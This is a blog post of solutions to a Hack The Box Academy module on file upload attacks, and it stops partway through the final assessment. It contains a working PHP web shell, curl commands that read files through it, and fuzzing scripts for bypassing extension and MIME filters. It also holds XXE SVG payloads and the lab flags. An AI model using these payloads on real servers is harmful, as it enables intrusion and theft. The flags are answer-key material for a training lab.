---
layout: post
title: HTB Academy - File Upload Attacks
author: Dave Winton
category: cybersecurity 
feature-img: "assets/img/pexels/Network.jpg"
tags: [hackthebox]
excerpt_separator: <!--more-->
---

## Module Summary
Many modern web applications have file upload capabilities, which are usually necessary for the web application's functionality to enable features like attaching files or changing a user's profile image. If the file upload functionality is not securely coded, it may be abused to upload arbitrary files to the back-end server, eventually leading to compromise of the back-end server.
<!--more-->
When an attacker can upload arbitrary files to the back-end server, they can upload malicious files, like web shells, which would enable them to execute arbitrary commands on the back-end server. This eventually allows attackers to take control over the entire server and all web applications hosted on it, which makes File Upload Attacks among the most critical web vulnerabilities.

This module will discuss the basics of identifying and exploiting file upload vulnerabilities and identifying and mitigating basic security restrictions in place to reach arbitrary file uploads.

In addition to the above, the File Upload Attacks module will teach you the following:

- What are file upload vulnerabilities?
- Examples of code vulnerable to file upload vulnerabilities
- Different types of file upload validations
- Detecting and exploiting basic file upload vulnerabilities
- Bypassing client-side file upload validation
- Bypassing blacklisted and whitelisted extension validation
- Bypassing type and content validation
- Bypassing other basic security restrictions
- Attacking upload forms with limited allowed file types
- Preventing file upload vulnerabilities through secure validation techniques

---

**Module Contents:**
- [Module Summary](#module-summary)
- [Section 01 - Absent Validation](#section-01---absent-validation)
- [Section 02 - Upload Exploitation](#section-02---upload-exploitation)
- [Section 03 - Client-Side Validation](#section-03---client-side-validation)
- [Section 04 - Blacklist Filters](#section-04---blacklist-filters)
- [Section 05 - Whitelist Filters](#section-05---whitelist-filters)
- [Section 06 - Type Filters](#section-06---type-filters)
- [Section 07 - Limited File Uploads](#section-07---limited-file-uploads)
- [Section 08 - Other Upload Attacks](#section-08---other-upload-attacks)
- [Section 09 - Preventing File Upload Vulnerabilities](#section-09---preventing-file-upload-vulnerabilities)
- [Section 10 - Skills Assessment](#section-10---skills-assessment)

## Section 01 - Absent Validation

**Solutions**

1. Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.

**Hint:** *You may use the 'system()' PHP function to execute system commands*

Use the payload provided...

Create a `get-hostname.php` file with the following contents:

```php
<?php system('hostname');?>
```

Next, upload the `get-hostname.php` file to the vulnerable website. 

Answer: `ng-1638211-fileuploadsabsentverification-fwl13-f7648f8bc-959zp `

## Section 02 - Upload Exploitation

**Solutions**

1. Try to exploit the upload feature to upload a web shell and get the content of /flag.txt

Create a `webshell.php` file with the following contents:

```php
`<?php system($_REQUEST['cmd']); ?>`
```

Next, upload the webshell.php file to the vulnerable website. 

Since we know that `/flag.txt` is in the root folder we can craft the payload like so:

```shell
curl 'http://SERVER:PORT/uploads/webshell.php?cmd=cat%20../../../../flag.txt'         
HTB{g07_my_f1r57_w3b_5h3ll}
```

Answer: `HTB{g07_my_f1r57_w3b_5h3ll}`

## Section 03 - Client-Side Validation

**Solutions**

1. Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)
   
**Hint:** *Try to locate the function responsible for validating the input type, then try to remove it without breaking the upload functionality*

If we navigate to the page source and check the contents of `script.js` we find the following javascript function for validation

```javascript
function validate() {
  var file = $("#uploadFile")[0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text("Only images are allowed!");
    File.form.reset();
    $("#submit").attr("disabled", true);
    return false;
  } else {
    return true;
  }
}
```

Let's also take a look at how it's called.

```html
    <h1>Update your profile image</h1>
    <center>
      <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onsubmit="if(validate()){upload()}">
        <input type="file" name="uploadFile" id="uploadFile" onchange="showImage()" accept=".jpg,.jpeg,.png">
        <img src="/profile_images/shell.php" class="profile-image" id="profile-image">
        <input type="submit" value="Upload" id="submit">
      </form>
      <br>
      <h2 id="error_message"></h2>
    </center>
```

Notice how the `upload()` function is called in the following line:

```html
<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onsubmit="if(validate()){upload()}">
```

If we edit `onsubmit` to skip `validate()` like this...

```html
**<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onsubmit="upload()">**
```

We can skip the entire validate process from ever happening

Let's upload the `webshell.php` from previous sections

```php
<?php system($_REQUEST['cmd']); ?>
```

Then we will upload that file, which is now allowed since we removed the conditional `if(validate())`.

Then we can access the file using the `profile_images` directory and append the same payload we have used in previous sections..

```shell
curl 'http://SERVER:PORT/profile_images/webshell.php?cmd=cat%20../../../../flag.txt'
HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
```

Answer: `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`

## Section 04 - Blacklist Filters

**Solutions**

1. Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"

**Hint:** *When you fuzz for allowed extensions, change the content to a PHP 'hello world' script. Then, when you you check the uploaded file, you would know whether it can execute PHP code.*

First, setup the Burp `Intruder` as instructed in the tutoria but we are going to set the payload to print `Hello World` to check for PHP code execution as the hint suggested.

So my `Intruder` request looked like this:

```shell
POST /upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 2774
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUSGNqD07AQpKxmco
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryUSGNqD07AQpKxmco
Content-Disposition: form-data; name="uploadFile"; filename="shell§payload§"
Content-Type: image/jpeg

<?php system('echo "Hello World"'); ?>

------WebKitFormBoundaryUSGNqD07AQpKxmco--
```

Now after running the attack, we could manually go through each option and find all the successful/unsuccessful uploads but since we injected that `echo "Hello World"` we can use `curl` to check for that in the response.  

I wrote the following bash snippet to check which extensions had PHP code execution. 

It sends a curl request and matches the response with `Hello World`

```shell
while read ext; do
    response=$(curl -s http://SERVER:PORT/profile_images/shell$ext)
    if [ "$response" = "Hello World" ]; then
        echo "Code execution with: $ext"
    fi
done < /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt 
Code execution with: .phar
```

As shown, `.phar` was the only extension which allowed PHP code to actually execute. So lets build our payload..

There are two ways to proceed with this attack. We can send the `.phar` request with `Repeater` and update the php code to the webshell that we've use multiple times in this module ...

```php
<?php system($_REQUEST['cmd']); ?>
```

Or we can manually upload the file from the website itself for some extra practice. Let's do that just to put our skills to the test. 

If we right-click and inspect the form we get the following..

```html
<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
        <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
        <img src="/profile_images/default.jpg" class="profile-image" id="profile-image">
        <input type="submit" value="Upload" id="submit">
      </form>
```

We need to change `onchange="checkFile(this)"` to `onchange=""`, removing the validation check.

Next we upload our webshell code (provided above) as `webshell.phar`, since we know `.phar` is not blacklisted and it can execute PHP code. 

After the webshell is uploaded you can navigate to `/profile_images/webshell.phar` through the site, but I think it's easier to send a `curl` request since we know what we are looking for...

```shell
curl 'http://SERVER:PORT/profile_images/webshell.phar?cmd=cat%20../../../../flag.txt'
HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
```

Answer: `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`

## Section 05 - Whitelist Filters

**Solutions**

1. The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

**Hint:** *You may use either of the last two techniques. If one extension is blocked, try another one that can execute PHP code.*

First we generate a custom wordlist as instructed in the tutorial:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     
	for ext in '.php' '.phps' '.phar' '.phtml'; do         
		echo "shell$char$ext.jpg" >> wordlist.txt
		echo "shell$ext$char.jpg" >> wordlist.txt
		echo "shell.jpg$char$ext" >> wordlist.txt         
		echo "shell.jpg$ext$char" >> wordlist.txt     
	done 
done   
```

Next we will set up Intruder to use the wordlist as a payload and we want to issue a PHP command to echo "Hello World" so we can test for execution like in the previous section

```
POST /upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 233
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrOBceWCxoaImBsEl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.3
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryrOBceWCxoaImBsEl
Content-Disposition: form-data; name="uploadFile"; filename="§shell§"
Content-Type: image/png

<?php system('echo "Hello World"'); ?>

------WebKitFormBoundaryrOBceWCxoaImBsEl--
```

Once that has completed, we can see there were 39 successful file uploads.

Next we will test each of the successful file uploads for command execution by checking if the response contains "Hello World", by slightly modifying `check-exec.sh` I wrote in the previous section..

```bash
-> cat check-exec.sh                                                                                 
while read ext; do
    response=$(curl -s http://SERVER:PORT/profile_images/$ext)
    if [ "$response" = "Hello World" ]; then
        echo "Code execution with: $ext"
    fi
done < /path/to/wordlist.txt

-> ./check-exec.sh                                                                                   
Code execution with: shell.phar..jpg
Code execution with: shell.phtml..jpg
Code execution with: shell..phar.jpg
Code execution with: shell.phar..jpg
Code execution with: shell..phtml.jpg
Code execution with: shell.phtml..jpg
Code execution with: shell.phar….jpg
Code execution with: shell….phtml.jpg
Code execution with: shell.phtml….jpg
Code execution with: shell:.phar.jpg
Code execution with: shell.phar:.jpg
Code execution with: shell:.phtml.jpg
Code execution with: shell.phtml:.jpg

```

Now that we know which extensions are both allowed and have code execution we can upload a web shell using repeater in Burp

```
POST /upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 231
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrOBceWCxoaImBsEl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryrOBceWCxoaImBsEl
Content-Disposition: form-data; name="uploadFile"; filename="shell….phar.jpg"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>

------WebKitFormBoundaryrOBceWCxoaImBsEl--

```

Finally, we can curl for the flag..

```shell
curl -s 'http://SERVER:PORT/profile_images/shell….phar.jpg?cmd=cat%20../../../../flag.txt'
HTB{1_wh173l157_my53lf}
```

Answer: `HTB{1_wh173l157_my53lf}`

## Section 06 - Type Filters

**Solutions**

1. The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
**Hint:** Start with a request that can be uploaded (e.g. jpg image), then try to find an allowed PHP extension that doesn't get blocked, then utilize one of the whitelist filter bypasses to bypass both extension filters.

First we need to determine how to bypass the black/whitelist filter by finding which extensions are allowed through. We can do this in burpsuite by using the SecLists web-extensions.txt wordlist.

I used the filename `cat.jpg` just to bypass the extension filer and setup up the request as below:

![module136-section06-question01-answer00](/assets/img/htb/mod136_sec06_q01_a00.png)

```
POST /upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 238031
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7NY6CAjxHW1d9jfW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary7NY6CAjxHW1d9jfW
Content-Disposition: form-data; name="uploadFile"; filename="cat.jpg§.ext§"
Content-Type: image/jpeg

GIF8
<?php system('echo "Hello World"'); ?>

------WebKitFormBoundary7NY6CAjxHW1d9jfW--

```

Take notice that we are using the `GIF8` identifier as instructed in the tutorial, then we are using the `echo "Hello World"` command to check for execution just like in previous sections.

The payload will be adding an extra extension to `cat.jpg`, for example it would be `cat.jpg.abc`, `cat.jpg.xyz` and so on.

![module136-section06-question01-answer01](/assets/img/htb/mod136_sec06_q01_a01.png)

We can see from the results that 27/44 extensions successfully uploaded, but as in previous sections we need to find the ones that actual have code execution.

Since we need to check if the response matches `"GIF8\nHello World"` this time, let's convert our `check-exec.sh` script into a python to script to ensure we are correctly matching for the right pattern.

```python
import requests

# Replace with your actual URL and port
base_url = "http://SERVER:PORT/profile_images/cat.jpg"

# Load the wordlist from the file
with open('/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt', 'r') as file:
    extensions = file.readlines()

# Loop over each extension in the wordlist
for ext in extensions:
    ext = ext.strip()  # Remove leading/trailing whitespace/newlines
    
    # Make the HTTP request
    url = f"{base_url}{ext}"
    try:
        response = requests.get(url)
        
        # Clean the response content: strip out any extra newlines, spaces, or carriage returns
        response_text = response.text.strip()
        response_text = response_text.replace('\r', '')  # Remove carriage returns if any
        
        # Define the exact match string
        exact_match = "GIF8\nHello World"
        
        # Compare the cleaned response to the exact match
        if response_text == exact_match:
            print(f"Code execution with: {ext}")
    
    except requests.RequestException as e:
        # Handle potential exceptions like connection errors
        print(f"Error fetching {url}: {e}")

```

and the results..

```shell
python3 check-exec.py
Code execution with: .phtml
Code execution with: .phar
```

Excellent, now we know that `.phar` and `.phtml` have execution we can do as we've done in previous sections and send a webshell in the request using a filename that bypasses the checks. 

I am sent the request over to Burp `Repeater` and formatted it like this:

```
POST /upload.php HTTP/1.1
Host: SERVER:PORT
Content-Length: 236
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7NY6CAjxHW1d9jfW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://SERVER:PORT
Referer: http://SERVER:PORT/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary7NY6CAjxHW1d9jfW
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.phar"
Content-Type: image/jpeg

GIF8
<?php system($_REQUEST['cmd']); ?>

------WebKitFormBoundary7NY6CAjxHW1d9jfW--

```

Finally, we use curl to get the flag

```shell
curl 'http://SERVER:PORT/profile_images/shell.jpg.phar?cmd=cat%20../../../../flag.txt'
GIF8
HTB{m461c4l_c0n73n7_3xpl0174710n}

```

Answer: `HTB{m461c4l_c0n73n7_3xpl0174710n}`

## Section 07 - Limited File Uploads

**Solutions**

1. The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
**Hint:** Use an attack that can read files, and don't forget to check the page source!

If we navigate to the page and click on the picture to see the Open file dialog box, we can see that it accepts on `.svg` files.

In the tutorial we were provided with an exploit for `.svg` files so let's use that here but update it to read the file `/flag.txt` instead of `/etc/passwd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///"> ]>
<svg>&xxe;</svg>
```

If we place this in a file called `exploit.svg` and upload it as a profile picture, we need only to check the page source afterwards to get the flag

![module136-section07-question01-answer01](/assets/img/htb/mod136_sec07_q01_a00.png)

Answer: `HTB{my_1m4635_4r3_l37h4l}`

1. Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
**Hint:** Use a different payload to read source 

Next we are going to use the exploit provided in the tutorial to read `upload.php`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

If we upload this as `get-source.svg` then check the page source, we find a Base64 encoded string. 

Take that over to burp `Decoder` or use the terminal to decode the string and get the answer...

![module136-section07-question02-answer01](/assets/img/htb/mod136_sec07_q02_a00.png)

```shell
echo "PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1sidXBsb2FkRmlsZSJdWyJuYW1lIl0pOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuICRmaWxlTmFtZTsKJGNvbnRlbnRUeXBlID0gJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0eXBlJ107CiRNSU1FdHlwZSA9IG1pbWVfY29udGVudF90eXBlKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsndG1wX25hbWUnXSk7CgppZiAoIXByZWdfbWF0Y2goJy9eLipcLnN2ZyQvJywgJGZpbGVOYW1lKSkgewogICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9Cgpmb3JlYWNoIChhcnJheSgkY29udGVudFR5cGUsICRNSU1FdHlwZSkgYXMgJHR5cGUpIHsKICAgIGlmICghaW5fYXJyYXkoJHR5cGUsIGFycmF5KCdpbWFnZS9zdmcreG1sJykpKSB7CiAgICAgICAgZWNobyAiT25seSBTVkcgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgICAgICBkaWUoKTsKICAgIH0KfQoKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICRsYXRlc3QgPSBmb3BlbigkdGFyZ2V0X2RpciAuICJsYXRlc3QueG1sIiwgInciKTsKICAgIGZ3cml0ZSgkbGF0ZXN0LCBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSkpOwogICAgZmNsb3NlKCRsYXRlc3QpOwogICAgZWNobyAiRmlsZSBzdWNjZXNzZnVsbHkgdXBsb2FkZWQiOwp9IGVsc2UgewogICAgZWNobyAiRmlsZSBmYWlsZWQgdG8gdXBsb2FkIjsKfQo=" | base64 -d
<?php
$target_dir = "./images/";
$fileName = basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!preg_match('/^.*\.svg$/', $fileName)) {
    echo "Only SVG images are allowed";
    die();
}

foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/svg+xml'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    $latest = fopen($target_dir . "latest.xml", "w");
    fwrite($latest, basename($_FILES["uploadFile"]["name"]));
    fclose($latest);
    echo "File successfully uploaded";
} else {
    echo "File failed to upload";
}

```

Answer: `./images/`

## Section 08 - Other Upload Attacks

## Section 09 - Preventing File Upload Vulnerabilities

## Section 10 - Skills Assessment

**Solutions**

1. Try to exploit the upload form to read the flag found at the root directory "/".
**Hint:** *Try to fuzz for non-blacklisted extensions, and for allowed content-type headers. If you are unable to locate the uploaded files, try to read the source code to find the uploads directory and the naming scheme.*

After navigating the website you should discover that the upload feature in the Contact page is vulnerable to a file upload attack.

![module136-section10-question01-answer00](/assets/img/htb/mod136_sec10_q01_a00.png)

By default, it appears the upload feature accepts only `.jpg`, `.jpeg`, `.png` but if we capture the request in Burp or ZAProxy we can begin to test for valid extensions through fuzzing like in previous sections.

I am first going to test for common image file extensions with this wordlist I generated...
 
```
.jpg 
.jpeg 
.png 
.gif 
.bmp 
.tiff 
.tif 
.webp 
.heif 
.heic 
.svg 
.ico 
.raw 
.pdf 
.eps 
.ai 
.indd
```

After running that through burp `Intruder`, we get 4 accepted file types `.jpeg`, `.jpg`, `.png` and `.svg`, easily recognised based on the response `Length`...

![module136-section10-question01-answer01](/assets/img/htb/mod136_sec10_q01_a01.png)

Since `.svg` is accepted why don't we try the XXE exploits from [Section 07 - Limited File Uploads](#section-07---limited-file-uploads) and see if we can get the `upload.php` page source to learmore about how it works...

![module136-section10-question01-answer02](/assets/img/htb/mod136_sec10_q01_a02.png)

The raw request:
```
POST /contact/upload.php HTTP/1.1
Host: SERVER:PORT
Origin: http://SERVER:PORT
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7NY6CAjxHW1d9jfW
Referer: http://SERVER:PORT/contact/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 342

------WebKitFormBoundary7NY6CAjxHW1d9jfW
Content-Disposition: form-data; name="uploadFile"; filename="xxe.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
------WebKitFormBoundary7NY6CAjxHW1d9jfW--
```

The response:

```
HTTP/1.1 200 OK
Date: Sat, 08 Mar 2025 04:55:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1443
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<svg>PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K</svg>
```

After base64 decoding we get...

```shell
echo "PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K" | base64 -d
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```

Now we know that user submitted images go into the `user_feedback_submissions` directory we can target it when using a web shell, we also know that the name of the files become `YYMMDD_filename.ext` based on the PHP `$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);`

So let's try directly uploading a web shell using the `.svg` extension...

![module136-section10-question01-answer03](/assets/img/htb/mod136_sec10_q01_a03.png)

It successfully uploads but we don't have code execution, so as in previous sections lets use burp to fuzz for code execution.

Using the bash wordlist generator, create a wordlist for `.svg ` files with double extensions and random chars as separators...

```shell
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "shell$char$ext.svg" >> wordlist-svg.txt
        echo "shell$ext$char.svg" >> wordlist-svg.txt
        echo "shell.svg$char$ext" >> wordlist-svg.txt
        echo "shell.svg$ext$char" >> wordlist-svg.txt
    done
done
```

Next, setup burp with the wordlist and fuzz the entire `filename` using `<?php system('echo "Hello World"'); ?>` as a way to test for code execution...

